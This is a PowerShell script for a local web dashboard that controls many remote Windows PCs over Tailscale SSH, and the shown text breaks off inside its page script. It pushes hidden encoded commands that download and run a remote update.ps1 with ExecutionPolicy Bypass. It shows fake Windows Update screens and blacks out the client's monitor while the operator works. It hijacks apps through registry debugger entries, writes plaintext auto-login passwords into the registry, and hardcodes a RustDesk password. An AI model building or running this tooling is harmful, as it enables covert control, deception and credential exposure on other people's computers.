# ================================================================
#  dashboard.ps1  -  ScreenConnect-style web dashboard (v2)
#  Live status + refresh, name-sync with CONNECT.bat,
#  in-page rename, and Lock screen text/color/image per client.
#  Local + private (127.0.0.1 only).
# ================================================================

$port      = 8760
$setupLink = "https://drive.google.com/uc?export=download&id=1zn0vG-xUl7RSCxTfm-gHjC7NF5I11hqO"   # direct-download link to SETUP-SSH-READY.bat
$login     = 'svc'
$protectedApps = @('tailscale.exe','sshd.exe','ssh.exe','powershell.exe','powershell_ise.exe','pwsh.exe','conhost.exe','rustdesk.exe','winlogon.exe','csrss.exe','services.exe','lsass.exe','smss.exe','wininit.exe','svchost.exe','explorer.exe','dwm.exe','userinit.exe')
$namesFile = "$env:APPDATA\client-names.txt"          # shared with CONNECT.bat
$overrideF = "$env:APPDATA\client-logins.txt"

$tsExe = 'tailscale'
if (Test-Path 'C:\Program Files\Tailscale\tailscale.exe') { $tsExe = 'C:\Program Files\Tailscale\tailscale.exe' }

function Load-Names {
    $h = @{}
    if (Test-Path $namesFile) { Get-Content $namesFile | ForEach-Object { if ($_ -match '^(.+?)=(.+)$') { $h[$matches[1].Trim().ToUpper()] = $matches[2].Trim() } } }
    return $h
}
function Save-Name($key, $name) {
    $h = Load-Names; $h[$key.ToUpper()] = $name
    ($h.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) | Set-Content $namesFile
}
function Login-For($ip) {
    if (Test-Path $overrideF) { foreach ($l in Get-Content $overrideF) { if ($l -match "^\s*$([regex]::Escape($ip))\s*=\s*(.+?)\s*$") { return $matches[1] } } }
    return $login
}

function Get-Clients {
    $names = Load-Names
    $out = @()
    $raw = & $tsExe status --json 2>$null
    if ($raw) {
        try {
            $j = ($raw | Out-String) | ConvertFrom-Json
            foreach ($prop in $j.Peer.PSObject.Properties) {
                $p = $prop.Value
                $ip = @($p.TailscaleIPs | Where-Object { $_ -match '^100\.' })[0]
                if (-not $ip) { continue }
                $chost = $p.HostName
                $online = [bool]$p.Online
                $lastSeen = $null
                if ($p.LastSeen) { try { $lastSeen = ([DateTime]$p.LastSeen).ToString('o') } catch {} }
                $name = if ($names.ContainsKey($chost.ToUpper())) { $names[$chost.ToUpper()] } elseif ($names.ContainsKey($ip)) { $names[$ip] } else { $chost }
                $out += [pscustomobject]@{ ip = $ip; host = $chost; name = $name; online = $online; lastSeen = $lastSeen }
            }
        } catch { $out = @() }
    }
    if ($out.Count -eq 0) {
        $lines = & $tsExe status 2>$null
        $i = 0
        foreach ($l in $lines) {
            if ($l -match '^(100\.\d+\.\d+\.\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s*(.*)$') {
                $ip = $matches[1]; $chost = $matches[2]
                if ($i -eq 0) { $i++; continue }
                $i++
                $online = ($l -notmatch 'offline')
                $name = if ($names.ContainsKey($chost.ToUpper())) { $names[$chost.ToUpper()] } elseif ($names.ContainsKey($ip)) { $names[$ip] } else { $chost }
                $out += [pscustomobject]@{ ip = $ip; host = $chost; name = $name; online = $online; lastSeen = $null }
            }
        }
    }
    return $out
}

function SSH-Run($ip, $cmd) {
    $u = Login-For $ip
    $r = ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=yes "$u@$ip" $cmd 2>&1
    return ($r | Out-String)
}
function Enc($ps) { [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($ps)) }

function Upgrade-All {
    $ips = Get-Clients
    $inner = '[Net.ServicePointManager]::SecurityProtocol=''Tls12''; $rp=$env:TEMP+''\ru.ps1''; Invoke-WebRequest ''https://raw.githubusercontent.com/kaal9009/rsupport/main/update.ps1'' -OutFile $rp -UseBasicParsing; Start-Process powershell -WindowStyle Hidden -ArgumentList ''-NoProfile'',''-ExecutionPolicy'',''Bypass'',''-File'',$rp'
    $launcher = "Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-EncodedCommand','$(Enc $inner)'"
    $encL = Enc $launcher
    $lines = @(); $ok = 0
    foreach ($c in $ips) {
        if (-not $c.online) { $lines += "$($c.name): offline - will auto-update within 30 min"; continue }
        SSH-Run $c.ip ("powershell -NoProfile -EncodedCommand $encL") | Out-Null
        $ok++; $lines += "$($c.name): upgrade started"
    }
    return "Upgrade pushed to $ok online client(s).`n`n" + ($lines -join "`n")
}

$reportPs = @'
$os=(Get-CimInstance Win32_OperatingSystem).Caption
$cs=Get-CimInstance Win32_ComputerSystem
$ram=[math]::Round($cs.TotalPhysicalMemory/1GB,1)
$d=Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
$free=[math]::Round($d.FreeSpace/1GB,1);$tot=[math]::Round($d.Size/1GB,1)
$up=(Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
"$env:COMPUTERNAME`n$os`nRAM ${ram}GB`nC: ${free}/${tot}GB free`nUptime $([int]$up.TotalHours)h"
'@

function Lock-Status($ip) {
    $r = SSH-Run $ip 'powershell -NoProfile -Command "if(Test-Path (Join-Path $env:ProgramData ''RemoteSupport\LOCK.flag'')){''YESLOCK''}else{''NOLOCK''}"'
    if ($r -match 'YESLOCK') { return 'locked' }
    elseif ($r -match 'NOLOCK') { return 'unlocked' }
    else { return 'unknown' }
}
function Get-Lock($ip) {
    $c = SSH-Run $ip 'cmd /c type C:\ProgramData\RemoteSupport\config.txt'
    $text=''; $color=''; $img=''
    foreach ($l in ($c -split "`n")) {
        if ($l -match '^LOCK_TEXT=(.*)')  { $text  = $matches[1].Trim() }
        if ($l -match '^LOCK_COLOR=(.*)') { $color = $matches[1].Trim() }
        if ($l -match '^LOCK_IMAGE=(.*)') { $img   = $matches[1].Trim() }
    }
    return @{ text=$text; color=$color; image=$img }
}
function Set-Lock($ip, $text, $color, $img) {
    $text  = ($text  -replace "'","" -replace "`r","" -replace "`n"," ").Trim()
    $color = ($color -replace "[^#0-9A-Fa-f]","").Trim()
    $img   = ($img   -replace "'","" -replace "\s","").Trim()
    $rps = @"
`$f='C:\ProgramData\RemoteSupport\config.txt'
`$k=@()
if(Test-Path `$f){ `$k=@(Get-Content `$f | Where-Object {`$_ -notmatch '^LOCK_TEXT=' -and `$_ -notmatch '^LOCK_COLOR=' -and `$_ -notmatch '^LOCK_IMAGE=' -and `$_.Trim() -ne ''}) }
`$k+='LOCK_TEXT=$text'
`$k+='LOCK_COLOR=$color'
`$k+='LOCK_IMAGE=$img'
if(-not (Test-Path (Split-Path `$f))){ New-Item -ItemType Directory -Path (Split-Path `$f) -Force | Out-Null }
Set-Content -Path `$f -Value `$k -Encoding ascii
"@
    SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $rps)) | Out-Null
    return "Saved. Press Lock to see it."
}
# Save which fake-update style (blue/black) the client should show, into config.txt LOCK_MODE
function Set-LockMode($ip, $mode) {
    $mode = ($mode -replace '[^a-zA-Z]','').ToLower()
    if ($mode -ne 'blue' -and $mode -ne 'black') { $mode = 'black' }
    $rps = @"
`$f='C:\ProgramData\RemoteSupport\config.txt'
`$k=@()
if(Test-Path `$f){ `$k=@(Get-Content `$f | Where-Object {`$_ -notmatch '^LOCK_MODE=' -and `$_.Trim() -ne ''}) }
`$k+='LOCK_MODE=$mode'
if(-not (Test-Path (Split-Path `$f))){ New-Item -ItemType Directory -Path (Split-Path `$f) -Force | Out-Null }
Set-Content -Path `$f -Value `$k -Encoding ascii
"@
    SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $rps)) | Out-Null
    return $mode
}
# Read back which mode the client currently has (blue/black), plus whether it's locked right now
function Get-LockMode($ip) {
    $c = SSH-Run $ip 'cmd /c type C:\ProgramData\RemoteSupport\config.txt'
    $mode='black'
    foreach ($l in ($c -split "`n")) { if ($l -match '^LOCK_MODE=(.*)') { $mode = $matches[1].Trim().ToLower() } }
    if ($mode -ne 'blue' -and $mode -ne 'black') { $mode='black' }
    return $mode
}

function Set-AutoLogin($ip, $pass) {
    $cu = (SSH-Run $ip 'powershell -NoProfile -Command "(Get-CimInstance Win32_ComputerSystem).UserName"').Trim()
    if (-not $cu) { return "Could not detect the logged-in user. Make sure someone is logged in on that PC." }
    $parts = $cu -split '\\', 2
    if ($parts.Count -eq 2) { $dom = $parts[0]; $usr = $parts[1] } else { $dom = '.'; $usr = $parts[0] }
    $uE = ($usr -replace "'", "''"); $dE = ($dom -replace "'", "''"); $pE = ($pass -replace "'", "''")
    $ps = @"
`$k='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
Set-ItemProperty `$k AutoAdminLogon '1'
Set-ItemProperty `$k DefaultUserName '$uE'
Set-ItemProperty `$k DefaultDomainName '$dE'
Set-ItemProperty `$k DefaultPassword '$pE'
Remove-ItemProperty `$k AutoLogonCount -EA 0
"@
    SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) | Out-Null
    return "Auto-login enabled for $dom\$usr. After the next restart, this PC goes straight to the desktop - no password screen. (If it still asks, the password entered didn't match his account.)"
}
function Clear-AutoLogin($ip) {
    $ps = "Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' AutoAdminLogon '0'; Remove-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' DefaultPassword -EA 0"
    SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) | Out-Null
    return "Auto-login turned off. This PC will ask for a password again."
}

function Scan-Apps($ip) {
    $ps = @'
$sh=New-Object -ComObject WScript.Shell
$paths=@("$env:ProgramData\Microsoft\Windows\Start Menu\Programs","$env:APPDATA\Microsoft\Windows\Start Menu\Programs")
$apps=@()
foreach($p in $paths){ if(Test-Path $p){ Get-ChildItem $p -Recurse -Filter *.lnk -EA 0 | ForEach-Object { $t=$sh.CreateShortcut($_.FullName).TargetPath; if($t -and $t -match '\.exe$'){ $apps+=[pscustomobject]@{name=$_.BaseName;exe=([IO.Path]::GetFileName($t)).ToLower()} } } } }
$ukeys=@('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*')
foreach($k in $ukeys){ Get-ItemProperty $k -EA 0 | ForEach-Object {
  if($_.DisplayName){
    $found=$false
    if($_.DisplayIcon){
      $ic=($_.DisplayIcon -split ',')[0].Trim('"')
      if($ic -match '\.exe$' -and (Test-Path $ic -EA 0)){ $apps+=[pscustomobject]@{name=$_.DisplayName;exe=([IO.Path]::GetFileName($ic)).ToLower()}; $found=$true }
    }
    if(-not $found -and $_.InstallLocation -and (Test-Path $_.InstallLocation -EA 0)){
      Get-ChildItem $_.InstallLocation -Filter *.exe -EA 0 | Select-Object -First 5 | ForEach-Object { $apps+=[pscustomobject]@{name=$_.BaseName;exe=$_.Name.ToLower()} }
    }
  }
}}
$apps | Where-Object { $_.exe } | Sort-Object exe -Unique | ConvertTo-Json -Compress
'@
    $r = SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps))
    return $r.Trim()
}
$script:appScanCache = @{}
function Get-AppScan($ip, $force) {
    $now = [DateTime]::UtcNow
    if (-not $force -and $script:appScanCache.ContainsKey($ip)) {
        $c = $script:appScanCache[$ip]
        if (($now - $c.time).TotalSeconds -lt 600) { return $c }
    }
    $entry = @{ time = $now; apps = (Scan-Apps $ip); blocked = (Get-Blocked $ip); blockmsg = (Get-BlockMsg $ip) }
    $script:appScanCache[$ip] = $entry
    return $entry
}
function Get-Blocked($ip) {
    $ps = @'
$k="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
$b=@()
if(Test-Path $k){ Get-ChildItem $k -EA 0 | ForEach-Object { if((Get-ItemProperty $_.PSPath -EA 0).Debugger){ $b+=$_.PSChildName.ToLower() } } }
$b | ConvertTo-Json -Compress
'@
    $r = SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps))
    return $r.Trim()
}
$blockHta = @'
<html><head><title>Blocked</title>
<hta:application id="a" border="thin" caption="yes" showintaskbar="no" scroll="no" sysmenu="yes" maximizebutton="no" minimizebutton="no" innerborder="no" contextmenu="no" selection="no" />
<style>
body{margin:0;font-family:'Segoe UI',Arial,sans-serif;background:#ffffff;overflow:hidden}
.wrap{padding:34px 40px;text-align:center}
.ic{font-size:56px;color:#d13438;line-height:1}
.title{font-size:27px;font-weight:600;color:#c00000;margin:12px 0 16px}
.msg{font-size:20px;color:#1b1b1b;line-height:1.5;margin-bottom:28px}
.btn{font-size:17px;padding:10px 40px;background:#0067c0;color:#fff;border:0;border-radius:5px;cursor:pointer}
</style></head>
<body>
<div class="wrap">
<div class="ic">&#9888;</div>
<div class="title">Access Blocked</div>
<div class="msg" id="m">This app is blocked.</div>
<button class="btn" onclick="window.close()">OK</button>
</div>
<script language="VBScript">
Sub Window_OnLoad
  window.resizeTo 540,360
  window.moveTo (screen.availWidth-540)/2,(screen.availHeight-360)/2
  Dim fso,p,msg
  p="C:\ProgramData\RemoteSupport\block-msg.txt"
  Set fso=CreateObject("Scripting.FileSystemObject")
  If fso.FileExists(p) Then
    msg=fso.OpenTextFile(p,1).ReadAll
    If Len(msg)>0 Then document.getElementById("m").innerText=msg
  End If
End Sub
</script></body></html>
'@
$blockVbsB64 = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($blockHta))


function Block-App($ip, $exe, $useMsg) {
    $exe = ($exe -replace '[^\w\.\-]', '').ToLower()
    if (-not $exe) { return "bad name" }
    if ($protectedApps -contains $exe) { return "PROTECTED: $exe can't be blocked - it would cut off your own access or break Windows." }
    $base = $exe -replace '\.exe$', ''
    $wsc = ($useMsg -eq $true -or $useMsg -eq 'true')
    $ps = @"
`$d='C:\ProgramData\RemoteSupport'; New-Item `$d -ItemType Directory -Force | Out-Null
`$k="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
New-Item `$k -Force | Out-Null
"@
    if ($wsc) { $ps += @"

[IO.File]::WriteAllBytes("`$d\blocked.hta",[Convert]::FromBase64String('$blockVbsB64'))
Set-ItemProperty `$k Debugger 'mshta.exe "C:\ProgramData\RemoteSupport\blocked.hta"'
"@ } else { $ps += @"

Set-ItemProperty `$k Debugger '"%windir%\system32\systray.exe"'
"@ }
    $ps += @"

Stop-Process -Name '$base' -Force -EA 0
taskkill /IM '$exe' /F /T 2>`$null
(Get-ItemProperty `$k -EA 0).Debugger
"@
    $r = (SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps))).Trim()
    $script:appScanCache.Remove($ip)
    if (-not $r) { return "Could not confirm the block took effect on $exe - check the connection to this client and try again." }
    return "Blocked $exe (and closed it if running)"
}
function Set-BlockMsg($ip, $msg) {
    $has = ($msg -and $msg.Trim())
    $msgB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes([string]$msg))
    if ($has) {
        $ps = @"
`$d='C:\ProgramData\RemoteSupport'; New-Item `$d -ItemType Directory -Force | Out-Null
[IO.File]::WriteAllBytes("`$d\blocked.hta",[Convert]::FromBase64String('$blockVbsB64'))
[IO.File]::WriteAllText("`$d\block-msg.txt",[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$msgB64')))
`$dbg='mshta.exe "C:\ProgramData\RemoteSupport\blocked.hta"'
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -EA 0 | ForEach-Object { if((Get-ItemProperty `$_.PSPath -EA 0).Debugger){ Set-ItemProperty `$_.PSPath Debugger `$dbg } }
"@
        SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) | Out-Null
        return "Message saved - blocked apps now show it."
    } else {
        $ps = @"
Remove-Item 'C:\ProgramData\RemoteSupport\block-msg.txt' -EA 0
`$dbg='"%windir%\system32\systray.exe"'
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -EA 0 | ForEach-Object { if((Get-ItemProperty `$_.PSPath -EA 0).Debugger){ Set-ItemProperty `$_.PSPath Debugger `$dbg } }
"@
        SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) | Out-Null
        return "Message cleared - blocked apps are silent."
    }
}
function Get-BlockMsg($ip) {
    $r = SSH-Run $ip 'cmd /c type C:\ProgramData\RemoteSupport\block-msg.txt 2>NUL'
    return ($r.Trim())
}
function Unblock-App($ip, $exe) {
    $exe = ($exe -replace '[^\w\.\-]', '').ToLower()
    $ps = @"
Remove-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe" -Recurse -Force -EA 0
"@
    SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) | Out-Null
    $script:appScanCache.Remove($ip)
    return "Unblocked $exe"
}
function Blocked-All {
    $out = @()
    foreach ($c in (Get-Clients)) {
        if (-not $c.online) { continue }
        $raw = (Get-Blocked $c.ip).Trim()
        $list = @()
        if ($raw) { try { $p = $raw | ConvertFrom-Json; if ($p -is [string]) { $list = @($p) } else { $list = @($p) } } catch {} }
        if ($list.Count) { $out += [pscustomobject]@{ name = $c.name; ip = $c.ip; blocked = $list } }
    }
    return ($out | ConvertTo-Json -Compress -Depth 5)
}

$script:lockedClients = @{}
function Save-LockState { }
# Keep each locked client's flag FRESH. The front-end pings /api/heartbeat every 3s, so
# this refreshes the flag well within the client's 30s freshness window. When the dashboard
# window is closed (or crashes / loses power), these pings stop, the flag goes stale, and
# every client drops its update screen on its own within ~30s. That's the auto-off on close.
function Heartbeat {
    foreach ($ip in @($script:lockedClients.Keys)) {
        $u = Login-For $ip
        Start-Process ssh -WindowStyle Hidden -ArgumentList '-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=5',"$u@$ip",'cmd /c echo.> C:\ProgramData\RemoteSupport\LOCK.flag' -ErrorAction SilentlyContinue
    }
    return $script:lockedClients.Count
}
# Called when the dashboard is closing: proactively drop every fake-update screen now
# (instant), rather than waiting for the 30s staleness timeout.
function Unlock-All {
    foreach ($ip in @($script:lockedClients.Keys)) {
        $u = Login-For $ip
        Start-Process ssh -WindowStyle Hidden -ArgumentList '-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=5',"$u@$ip",'cmd /c del /f /q C:\ProgramData\RemoteSupport\LOCK.flag' -ErrorAction SilentlyContinue
    }
    $script:lockedClients.Clear()
}

function Do-Action($ip, $action) {
    switch ($action) {
        'upgrade'  {
            $inner = '[Net.ServicePointManager]::SecurityProtocol=''Tls12''; $rp=$env:TEMP+''\ru.ps1''; Invoke-WebRequest ''https://raw.githubusercontent.com/kaal9009/rsupport/main/update.ps1'' -OutFile $rp -UseBasicParsing; Start-Process powershell -WindowStyle Hidden -ArgumentList ''-NoProfile'',''-ExecutionPolicy'',''Bypass'',''-File'',$rp'
            $launcher = "Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-EncodedCommand','$(Enc $inner)'"
            SSH-Run $ip ("powershell -NoProfile -EncodedCommand $(Enc $launcher)") | Out-Null
            return "Upgrade started."
        }
        'terminal' { $u = Login-For $ip; Start-Process cmd "/k ssh -l $u $ip"; return "Opened terminal window." }
        'privacy'  {
            $rd = @('C:\Program Files\RustDesk\rustdesk.exe','C:\Program Files (x86)\RustDesk\rustdesk.exe') | Where-Object { Test-Path $_ } | Select-Object -First 1
            if (-not $rd) { return "Install RustDesk on THIS PC first (rustdesk.com)." }
            Start-Process $rd "--connect $ip"
            return "RustDesk opening. In its top toolbar click the SHIELD (Privacy Mode) - the client's monitor goes black + locked, while you keep working. Password if asked: Support@2026!"
        }
        'screen'   {
            $rd = @('C:\Program Files\RustDesk\rustdesk.exe','C:\Program Files (x86)\RustDesk\rustdesk.exe') | Where-Object { Test-Path $_ } | Select-Object -First 1
            if (-not $rd) { return "Install RustDesk on THIS PC first (get it free at rustdesk.com - no account needed)." }
            Start-Process $rd "--connect $ip"
            return "Opening RustDesk to $ip. If it asks for a password, type: Support@2026!  (If nothing opens, type $ip into RustDesk's box and Connect.)"
        }
        'restart'  { SSH-Run $ip 'shutdown /r /t 0' | Out-Null; return "Restart sent." }
        'shutdown' { SSH-Run $ip 'shutdown /s /t 0' | Out-Null; return "Shutdown sent." }
        'health'   { return (SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $reportPs))) }
        'who'      { return (SSH-Run $ip 'query user') }
        'lock'     { SSH-Run $ip 'cmd /c echo.> C:\ProgramData\RemoteSupport\LOCK.flag' | Out-Null; $script:lockedClients[$ip]=$true; Save-LockState; return "Lock sent - client screen is locking." }
        'unlock'   { SSH-Run $ip 'cmd /c del /f /q C:\ProgramData\RemoteSupport\LOCK.flag' | Out-Null; $script:lockedClients.Remove($ip); Save-LockState; return "Unlock sent - client screen released." }
        default    { return "Unknown action." }
    }
}

$html = @'
<!DOCTYPE html><html><head><meta charset="utf-8"><title>My Remote Dashboard</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:Segoe UI,Arial,sans-serif}
body{background:#0f1420;color:#e6eaf2;display:flex;height:100vh;overflow:hidden}
#left{width:320px;background:#161d2e;border-right:1px solid #263148;display:flex;flex-direction:column}
.top{padding:14px 16px;border-bottom:1px solid #263148}
.top h1{font-size:15px;font-weight:600;color:#fff}
.rowflex{display:flex;align-items:center;gap:8px;margin-top:4px}
.top p{font-size:12px;color:#7d8aa5}
.rbtn{font-size:12px;color:#9fb0d0;background:none;border:1px solid #2c3752;padding:4px 9px;border-radius:6px;cursor:pointer}
.rbtn:hover{background:#22304e}
#search{width:100%;margin-top:10px;padding:8px 10px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:13px}
#list{flex:1;overflow-y:auto}
.row{display:flex;align-items:center;gap:10px;padding:11px 16px;cursor:pointer;border-bottom:1px solid #1d2537}
.row:hover{background:#1c2438}
.row.sel{background:#233152}
.dot{width:9px;height:9px;border-radius:50%;flex:none}
.on{background:#38d16a}.off{background:#5a6577}
.rname{font-size:13.5px;color:#eef2f8}
.rhost{font-size:11px;color:#7d8aa5}
#right{flex:1;display:flex;flex-direction:column;overflow-y:auto}
.rtop{padding:16px 20px;border-bottom:1px solid #263148;display:flex;align-items:center;gap:12px}
.rtop .big{font-size:17px;font-weight:600;color:#fff}
.rtop .sub{font-size:12px;color:#7d8aa5}
.badge{font-size:11px;padding:3px 9px;border-radius:20px}
.badge.on{background:#123a22;color:#5fe08a}.badge.off{background:#33262a;color:#e0868f}
.acts{padding:20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px}
button.act{padding:14px;border-radius:9px;border:1px solid #2c3752;background:#1a2236;color:#e6eaf2;font-size:14px;cursor:pointer;text-align:left}
button.act:hover{background:#243050;border-color:#3a4a72}
button.act.danger:hover{background:#3a2226;border-color:#7a3a42}
button.act.go{background:#1c3a6b;border-color:#295596}
button.act.go:hover{background:#245089}
#out{margin:0 20px 12px;padding:14px;background:#0c1120;border:1px solid #263148;border-radius:8px;font-family:Consolas,monospace;font-size:12.5px;color:#a9d6b6;white-space:pre-wrap;min-height:40px;max-height:180px;overflow:auto}
.lockbox{margin:0 20px 24px;padding:16px;background:#141b2b;border:1px solid #263148;border-radius:10px}
.lockbox h3{font-size:14px;color:#dfe6f2;margin-bottom:12px}
.fld{margin-bottom:12px}
.fld label{display:block;font-size:12px;color:#8fa0c0;margin-bottom:5px}
.fld input[type=text],.fld input[type=url]{width:100%;padding:9px 11px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:13px}
.fld input[type=color]{width:52px;height:34px;border:1px solid #2c3752;background:#0f1420;border-radius:6px;cursor:pointer;vertical-align:middle}
.savebtn{margin-top:4px;padding:10px 18px;border-radius:7px;border:1px solid #295596;background:#1c3a6b;color:#fff;font-size:13px;cursor:pointer}
.savebtn:hover{background:#245089}
.hint{font-size:11px;color:#6f7ea0;margin-top:6px}
#empty{flex:1;display:flex;align-items:center;justify-content:center;color:#5a6577;font-size:14px}
.rn{margin-left:auto;font-size:12px;color:#9fb0d0;background:none;border:1px solid #2c3752;padding:5px 10px;border-radius:6px;cursor:pointer}
</style></head><body>
<div id="left">
  <div class="top"><h1>My Remote Dashboard</h1>
    <div class="rowflex"><p id="count">Loading...</p><button class="rbtn" onclick="load()">Refresh</button><button id="upBtn" class="rbtn" style="border-color:#295596;color:#9dc3ff;" onclick="upgradeAll()">Upgrade all</button><button class="rbtn" style="border-color:#2e7d46;color:#8fe0a8;" onclick="newClient()">+ New client</button></div>
    <input id="search" placeholder="Search clients..." oninput="render()"></div>
  <div id="list"></div>
</div>
<div id="right"><div id="empty">Select a client from the left</div></div>
<script>
let clients=[],sel=null;
async function load(){try{const r=await fetch('/api/clients');clients=await r.json();}catch(e){}render();syncBadge();}
function render(){
  const q=(document.getElementById('search').value||'').toLowerCase();
  const on=clients.filter(c=>c.online).length;
  document.getElementById('count').textContent=clients.length+' clients - '+on+' online';
  const list=document.getElementById('list');list.innerHTML='';
  clients.filter(c=>(c.name+c.host+c.ip).toLowerCase().includes(q)).forEach(c=>{
    const d=document.createElement('div');d.className='row'+(sel&&sel.ip===c.ip?' sel':'');
    const seenLine=c.online?(esc(c.host)+' - '+c.ip):(esc(c.host)+' - last seen '+timeAgo(c.lastSeen));
    d.innerHTML='<span class="dot '+(c.online?'on':'off')+'"></span><div><div class="rname">'+esc(c.name)+'</div><div class="rhost">'+seenLine+'</div></div>';
    d.onclick=()=>{sel=c;render();panel();};list.appendChild(d);
  });
}
function syncBadge(){
  if(!sel)return;const c=clients.find(x=>x.ip===sel.ip);if(!c)return;sel.online=c.online;sel.lastSeen=c.lastSeen;
  const b=document.getElementById('badge');if(b){b.className='badge '+(c.online?'on':'off');b.textContent=c.online?'Online':'Offline';}
}
function panel(){
  const r=document.getElementById('right');if(!sel){r.innerHTML='<div id="empty">Select a client</div>';return;}
  r.innerHTML=`
   <div class="rtop"><div><div class="big">${esc(sel.name)}</div><div class="sub">${esc(sel.host)} - ${sel.ip}${sel.online?'':' - last seen '+timeAgo(sel.lastSeen)}</div></div>
     <span id="badge" class="badge ${sel.online?'on':'off'}">${sel.online?'Online':'Offline'}</span>
     <button class="rn" onclick="rename()">Rename</button></div>
   <div class="acts">
     ${btn('screen','Open screen','go')}
     ${btn('privacy','Privacy screen (I work)','go')}
     ${btn('terminal','Terminal','')}
     ${btn('lock','Lock screen','go')}
     ${btn('unlock','Unlock','')}
     ${btn('health','Health / specs','')}
     ${btn('who','Who is logged in','')}
     <button class="act" onclick="autoLogin()">Auto-login (no password)</button>
     <button class="act" onclick="appMgr()">Block apps</button>
     ${btn('restart','Restart','danger')}
     ${btn('shutdown','Shutdown','danger')}
   </div>
   <div id="out">Ready.</div>
   <div class="lockbox">
     <h3>Lock screen settings for this client</h3>
     <div id="lockStatus" style="display:inline-block;font-size:12px;padding:5px 12px;border-radius:20px;background:#33262a;color:#e0868f;margin-bottom:14px">Checking lock status...</div>
     <div class="fld"><label>Fake-update screen (Windows Update style)</label>
       <div style="display:flex;gap:14px;flex-wrap:wrap;align-items:center">
         <div style="display:flex;align-items:center;gap:7px">
           <span style="font-size:13px;color:#cfe0ff">Blue</span>
           <button type="button" id="tgBlue" onclick="toggleMode('blue')" style="padding:7px 16px;border-radius:7px;border:1px solid #2a6bb0;background:#0067b8;color:#fff;font-size:12.5px;cursor:pointer">OFF</button>
         </div>
         <div style="display:flex;align-items:center;gap:7px">
           <span style="font-size:13px;color:#cfcfcf">Black</span>
           <button type="button" id="tgBlack" onclick="toggleMode('black')" style="padding:7px 16px;border-radius:7px;border:1px solid #555;background:#000;color:#fff;font-size:12.5px;cursor:pointer">OFF</button>
         </div>
         <span id="modeBadge" style="margin-left:4px;font-size:12px;padding:5px 12px;border-radius:20px;background:#2b3550;color:#9fb0d0">Off</span>
       </div>
       <div class="hint">Click Blue or Black to show that update screen on the client. Click the same button again to turn it off.</div>
     </div>
     <div class="fld"><label>Company name (shows at bottom)</label><input type="text" id="lktext" placeholder="CloudPulse IT Services"></div>
     <div class="fld"><label>Background color</label><input type="color" id="lkcolor" value="#0f172a"></div>
     <div class="fld"><label>Background image link (optional)</label><input type="url" id="lkimg" placeholder="https://.../your-image.png"></div>
     <button class="savebtn" onclick="saveLock()">Save lock settings</button>
     <div class="hint">Leave blank to use defaults (navy + "Maintenance in progress"). Image must be a direct link ending in .png/.jpg.</div>
   </div>`;
  loadLock();
}
function btn(a,label,cls){return `<button class="act ${cls}" onclick="act('${a}')">${label}</button>`;}
async function act(a){
  const o=document.getElementById('out');
  if(a==='lock'){showProg(0,1,'Locking '+sel.name+' screen...');}
  else if(a==='unlock'){showProg(0,1,'Unlocking '+sel.name+'...');}
  else if(o)o.textContent='Working...';
  try{const r=await fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,action:a})});
  const j=await r.json();
  if(a==='lock'){updProg(1,1,'Locked - client screen is showing the update screen.');setTimeout(hideProg,2500);setTimeout(checkLock,1500);}
  else if(a==='unlock'){updProg(1,1,'Unlocked - client screen released.');setTimeout(hideProg,2500);setTimeout(checkLock,1500);}
  if(o)o.textContent=j.output||'(no output)';}catch(e){hideProg();if(o)o.textContent='Error: '+e;}
}
async function checkLock(){
  const el=document.getElementById('lockStatus');if(!el||!sel)return;
  try{const r=await fetch('/api/lockmodeget?ip='+sel.ip);const j=await r.json();const s=j.status;
  paintMode(j.active||'off');
